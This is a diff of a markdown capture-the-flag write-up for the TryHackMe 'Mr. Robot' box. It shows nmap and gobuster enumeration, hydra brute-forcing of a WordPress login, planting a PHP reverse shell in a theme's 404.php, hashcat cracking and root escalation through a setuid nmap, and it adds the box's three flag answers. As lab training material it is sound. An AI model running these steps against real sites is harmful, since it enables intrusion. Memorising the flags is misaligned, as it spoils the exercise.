@@ -1,6 +1,6 @@
-# Write Up for Try_Hack_Me box - Mr. Robot CTF
+# Write Up for Try_Hack_Me box - [Mr. Robot CTF](https://tryhackme.com/room/mrrobot)
 
-This box was first put on VulnHub.com and is a relatively easy box. \
+This box was first put on VulnHub.com and is a relatively easy box.\
 The box is based around the show Mr. Robot and is a boot-to-root type with aim to find the three hidden flags.
 
 > Pratyush Prakhar (5#1NC#4N) - 11/11/2020
@@ -22,7 +22,9 @@ So, without wasting anymore time, lets just jump right in and start with enumera
 
 ## Services Enumeration
 
-Ran a quick scan for all ports usinng nmap. Nmap is the most widely used tool for services enumeration. If it was a local box, we could have used _netdiscover_ to obatin the IP of the box.
+1. Ran a quick scan for all ports usinng nmap. Nmap is the most widely used tool for services enumeration. If it was a local box, we could have used _netdiscover_ to obtain the IP of the box.
+
+**Output**
 
 ```bash
 # Nmap 7.91 scan initiated Wed Nov 11 22:40:19 2020 as: 
@@ -38,7 +40,9 @@ PORT    STATE  SERVICE REASON
 443/tcp open   https   syn-ack ttl 61
 ```
 
-Then ran a standard scan for the specific open ports found - **22, 80, 443**.
+2. Then ran a standard scan for the specific open ports found - **22, 80, 443**.
+
+**Output**
 
 ```bash
 # Nmap 7.91 scan initiated Wed Nov 11 22:46:57 2020 as: 
@@ -88,45 +92,44 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ## Web Reconnaissance
 
-We go and check out the website hosted at the port 80.
+1. We go and check out the website hosted at the port 80.
 
 ![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/web_home_80.png)
 
-We can explore the 6 options presented to us at the main page. You don't get anything useful from visiting them unless you want to join Mr. Robot on his mission!! We also visit the website hosted on the port 443. We see that it just the ssl version of the website on port 80. **We also don't find any information leak from the certificate.** \
+2. We can explore the 6 options presented to us at the main page. You don't get anything useful from visiting them unless you want to join Mr. Robot on his mission!! We also visit the website hosted on the port 443. We see that it just the ssl version of the website on port 80. **We also don't find any information leak from the certificate.** \
 So, let us start with some manual enumeration while we run the gobuster in the background. Checking the **robots.txt** file. We find that there are two files that are prohibited for all User-Agents. 
 
 ![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/robots.png)
 \
 fsocity.dic - It is a tailored wordlist. Possible fuzzable parameters and can be stored for later. We can remove the duplicacy by using _sort -u_.  
 
+**Output**
 ```bash
  wget 10.10.87.211/fsocity.dic
  uname -u fsocity.dic > cred.dic
 ```
-**/key-1-of-3.txt link - If we visit this link, we find us the first key. Submit it.** \
-\
-Checking the page source for the main page, we get an easter egg.
+**/key-1-of-3.txt link - If we visit this link, we find us the first key. Submit it.** 
+
+3. Checking the page source for the main page, we get an easter egg.
 
 ![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/80_src.png)
-    
-Lastly, we can check for the what are the accepatble extensions for the files. Thus, we understand that it is a php web server. This allows us to tailor the malicious payloads that we can upload.\
+\   
+Lastly, we can check for the what are the acceptable extensions for the files. Thus, we understand that it is a php web server. This allows us to tailor the malicious payloads that we can upload.\
 _.php_ loads perfectly  while other extensions like _.html_ go in an infinite loop. This means that php files are acceptable. We can inject malicious php scripts later.
 
 ![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/valid_ext_php.png)
 \
 Let's look at the results that came back from gobuster now. We included the -x option for php extension which we enumerated earlier.\
-The standard command is as follows with options as
-1. dir : It specified the directory listing brute force.
-2. -u  : URL
-3. -w  : wordlist to brute force directory listing against.
-4. -x  : extensions. This options take every word in metioned wordlist and append the extension at the end.\
+The standard command is as follows with options as\
+*dir* : It specified the directory listing brute force.\
+*-u* : URL\
+*-w*  : wordlist to brute force directory listing against.\
+*-x* : extensions. This options take every word in mentioned wordlist and append the extension at the end.\
 
+**Output**
 ```bash
 $ gobuster dir -u http://10.10.87.211/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php
-``` 
-\
-**OUTPUT**
-```bash
+
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -163,18 +166,21 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /dashboard (Status: 302)
 ```
 
-We see that there are few other easter eggs when you try to find out the documents that usually contain information such as version or release date. /readme is such an example. I leave the rest upto you to find.
+We see that there are few other easter eggs when you try to find out the documents that usually contain information such as version or release date. readme is such an example. I leave the rest up to you to find.
 
 ![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/readme_dir.png)
-\
-The other peculiar thing is that most of the other pages like /image are **Forbidden** and others lead to the standard _/wp-login_ page. It ensures that 	  to move further we need _valid credentials_ to login into the wordpress site.
+
+
+4. The other peculiar thing is that most of the other pages like /image are **Forbidden** and others lead to the standard _/wp-login_ page. It ensures that to move further we need _valid credentials_ to login into the wordpress site.
 
 ![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/forbidden.png)
 \
 ![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/login_dir_302_wp-login.png)
 \
-As this is a wordpress site, we can launch a *wpscan* in the background. Always good to have some enumeration running in the backgorund. Rabbit holes are deep man!! Don't fall too deep in them.\
-We are doing an agressive search for possible plugins, themes and databases.
+As this is a wordpress site, we can launch a *wpscan* in the background. Always good to have some enumeration running in the background. Rabbit holes are deep man!! Don't fall too deep in them.\
+We are doing an aggressive search for possible plugins, themes and databases.\
+
+**Output**
 
 ```bash
 $ wpscan -v -e ap,at,cb --url http://10.10.87.211/
@@ -182,7 +188,7 @@ $ wpscan -v -e ap,at,cb --url http://10.10.87.211/
 
 ## HYDRA
 
-We can use any fuzzer available such as _wfuzz, hydra and patator_. One can choose any one of the following for this purpose. We would need the _http-post-form_ option as this wp-login is a post form as seen in the burp intercept.
+1. We can use any fuzzer available such as _wfuzz, hydra and patator_. One can choose any one of the following for this purpose. We would need the _http-post-form_ option as this wp-login is a post form as seen in the burp intercept.
 
 ![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/burp.png)
 \
@@ -191,18 +197,17 @@ Let's enumerate the user first. We see that an **invalid user** can be distingus
 ![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/invalid_usr.png)
 \
 Let's run hydra now!! The various options are\
-1. -T : Threads. Default set to 16. One can increase it to reduce fuzz time. I set it to 100.
-2. -L : List of username to enumerate. Will be injected at the _^USER^_ handle.
-3. -p : Single entry replaced at _^PASS^_ handle.
-4. -o : output to a particuar file
-5. http-post-form : The module for fuzzing post forms. The following string contains three part - (Login_Page dir:Post_Parameters:Invalid_Result). So, we provide the needed and we can use the enumerated invalid response as third field.
+*-T* : Threads. Default set to 16. One can increase it to reduce fuzz time. I set it to 100.\
+*-L* : List of username to enumerate. Will be injected at the _^USER^_ handle.\
+*-p* : Single entry replaced at _^PASS^_ handle.\
+*-o* : output to a particular file\
+*http-post-form* : The module for fuzzing post forms. The following string contains three part - (Login_Page dir:Post_Parameters:Invalid_Result). So, we provide the needed and we can use the enumerated invalid response as third field.\
+
+**Output**
 
 ```bash
 $ hydra -T100 -f -L www/downloads/cred.dic -p passwd -o userenum.txt 10.10.87.211 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.87.211%2Fwp-admin%2F&testcookie=1:F=Invalid username"
-```
-\
-**RESULT**
-```bash
+
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-12 00:01:32
 [WARNING] reducing maximum tasks to MAXTASKS (64)
 [DATA] attacking http-post-form://10.10.87.211:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.87.211%2Fwp-admin%2F&testcookie=1:F=Invalid username.
@@ -211,32 +216,28 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-12 00:01:
 ```
 We find a valid user. Now we can enumerate for the password.\
 We do it one after the other to save us loads of time. If we fuzzed both together, it would generate loads of invalid creds and to track invalid status would also be a pain.\
-Like earlier, **invalid passwords** can be seperated in two ways. First, we can use the invalid password reponse returned. Better is to use the _STATUS_CODE : 302_ as on valid credentials the site will redirect to the /wp-admin page.
-Let's run hydra now.
-We use some different options like
-1. -l : to supply the enumerated username 
-2. -P : supply a dictionary of possible passwords. - _fsocity.dic_
-3. :S=302 : To tell post-form module to display the credentials only for a _REDIRECTION_. Thus, giving us the valid credentials. 
+Like earlier, **invalid passwords** can be separated in two ways. First, we can use the invalid password response returned. Better is to use the _STATUS_CODE : 302_ as on valid credentials the site will redirect to the /wp-admin page.
+Let's run hydra now to find creds.
+
+**Output**
 
 ```bash
 $ hydra -T100 -f -l elliot -P www/downloads/cred.dic 10.10.87.211 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&re
 direct_to=http%3A%2F%2F10.10.87.211%2Fwp-admin%2F&testcookie=1:S=302"
-```
-\
-**RESULT**
-```bash
+
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-12 00:45:26
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
 [DATA] attacking http-post-form://10.10.87.211:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.87.211%2Fwp-admin%2F&testcookie=1:S=302
 [80][http-post-form] host: 10.10.87.211   login: *******   password: ************
 [STATUS] attack finished for 10.10.87.211 (valid pair found)
 ```
-We find valid credentails. We can now login using this.
+\
+We find valid credentials. We can now login using this.
 
 
 ## WORDPRESS & REVERSE SHELL
 
-We are greeted with a standard _/wp-admin_ page. We will move around and see if we find something that can get us a shell.
+1. We are greeted with a standard _/wp-admin_ page. We will move around and see if we find something that can get us a shell.
 
 ![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/wp_admin.png)
 \
@@ -264,6 +265,7 @@ We can now replace contents of a file like _404.php_ with reverse shell code. We
 I am using standard php reverse shell script from pentestmonkey(https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to replace the content of the 404.php page. The only thing to change is the _IP and PORT_ on which you are listening. A person just starting out will find all the scripts rather useful.\
 \
 **SCRIPT**
+
 ```php
 	<?php
 	// php-reverse-shell - A Reverse Shell implementation in PHP
@@ -437,11 +439,14 @@ daemon@linux:/$ export SHELL=bash
 daemon@linux:/$ export TERM=xterm-256color
 daemon@linux:/$ stty rows 46 columns 187
 ```
+\
 We now have a stabilized shell and thus we can now go and enumerate the system.
 
 ## LOCAL ENUMERATON
 
-Let's look around. We can use the _find_ command. We see that the 2nd key exits in home directory of the user __robot__. But we see that it can only be read by the owner robot. So, we need to pivot to this user. We also find the backup of robot's raw md5 password. We can crack this password using __hashcat__.
+1. Let's look around. We can use the _find_ command. We see that the 2nd key exits in home directory of the user __robot__. But we see that it can only be read by the owner robot. So, we need to pivot to this user. We also find the backup of robot's raw md5 password. We can crack this password using __hashcat__.
+
+**OUTPUT**
 
 ```bash
 daemon@linux:/$ find /home/ -type f -iname "*.txt"
@@ -460,20 +465,10 @@ drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
 daemon@linux:/home/robot$ cat password.raw-md5 
 ```
 
-We can use following command to find the mode for cracking raw md5. We can then supply famous rockyou list to crack the md5sum. We find that the credentials for the user robot.
-
-```bash
-~/Desktop/Boxes/Try_Hack_Me/Mr_Robot_CTF$ hashcat --example-hashes                                                                                                               
-hashcat (v6.1.1) starting...
-
-MODE: 0
-TYPE: MD5
-HASH: 8743b52063cd84097a65d1633f5c74f5
-PASS: hashcat 
-......     
-```
+2. We can use following command to find the mode for cracking raw md5. We can then supply famous rockyou list to crack the md5sum. We find that the credentials for the user robot.
 
 **OUTPUT**
+
 ```bash
 $ hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt  
 
@@ -509,17 +504,20 @@ Stopped: Thu Nov 12 21:41:14 2020
 ```
 
 **We can use the above creds to pivot to robot user. Now we can read the 2nd key and submit it.**
-
+\
 ```bash
 robot@linux:~$ whoami
 robot
 robot@linux:~$ cat key-2-of-3.txt 
 ```
 
+
 ## PRIVILEGE ESCALATION
 
-Lastly, we have too look for a path to privesc ourseleves to the root user. For this I am using **Linpeas script**. It is basically an upgrade to the **Linenum script** with color coded output for severity and cool animation. This is the part of _privilege-escalation-awesome-scripts-suite_ which also has one for Windows too (https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite). \
+1. Lastly, we have too look for a path to privesc ourseleves to the root user. For this I am using **Linpeas script**. It is basically an upgrade to the **Linenum script** with color coded output for severity and cool animation. This is the part of _privilege-escalation-awesome-scripts-suite_ which also has one for Windows too (https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite). \
 I did a full scan using the -a option. One can go and read the color output using.\
+
+**OUTPUT**
 
 ```bash
 less -r output_file
@@ -548,7 +546,9 @@ drwxr-xr-x 14 root  root     480 Nov 13 02:15 ..
 -rw-rw-r--  1 robot robot  91965 Nov 13 03:02 local_enum.txt
 ```
 
-While going through the output we see an intresting binary _/usr/local/bin/nmap_. It has set uid permission and the owner is root. In simplest terms, execution of this file will gives temporary permissions to our user(robot) to run the program/file with the permission of the file owner root.
+2. While going through the output we see an intresting binary _/usr/local/bin/nmap_. It has set uid permission and the owner is root. In simplest terms, execution of this file will gives temporary permissions to our user(robot) to run the program/file with the permission of the file owner root.
+
+**RESULTS**
 
 ```bash
 ====================================( Interesting Files )=====================================
@@ -573,11 +573,13 @@ While going through the output we see an intresting binary _/usr/local/bin/nmap_
 -r-sr-xr-x 1 root root  14K Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
 ```
 
-So, to exploit this let us visit to __GTFOBINS__(https://gtfobins.github.io/) which provide us with Unix binaries' expoits to bypass system security. We can search for _nmap_.
+3. So, to exploit this let us visit to __GTFOBINS__(https://gtfobins.github.io/) which provide us with Unix binaries' expoits to bypass system security. We can search for _nmap_.
 
 ![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/sudo.png)
-\
-So, let's now use take advantage of the nmap's interactive mode and privesc to root. We find the last key in the /root directory. **We can submit this and mark this box as complete !!**
+
+4. So, let's now use take advantage of the nmap's interactive mode and privesc to root. We find the last key in the /root directory. **We can submit this and mark this box as complete !!**
+
+**Output**
 
 ```bash
 robot@linux:~$ /usr/local/bin/nmap --interactive
@@ -592,9 +594,18 @@ root
 firstboot_done  key-3-of-3.txt
 ~# cat key-3-of-3.txt
 ```
-\
+
+## Answers to complete the box
+
+1. What is key 1? - **073403c8a58a1f80d943455fb30724b9**
+
+2. What is key 2? - **822c73956184f694993bede3eb39f959**
+
+3. What is key 3? - **04787ddef27c3dee1ee161b21670b4e4**
+
+
 So, in the end I just want to say thank certain people whose resources have guided me along the way - [John Hammond](https://twitter.com/_johnhammond), [Heath Adams](https://twitter.com/thecybermentor), [IPPSEC](https://twitter.com/ippsec) and [Joseph Perry](https://www.linkedin.com/in/jrpiv/). It is just a start with miles to go.\
 Keep hacking till we meet again!!
 
-Stay Tuned On\
+**Stay Tuned On**\
 [![alt text](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/Github.png)](https://github.com/pratty010/Boxes)   [![alt text](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/LinkedIn.png)](https://www.linkedin.com/in/pratyush-prakhar/)
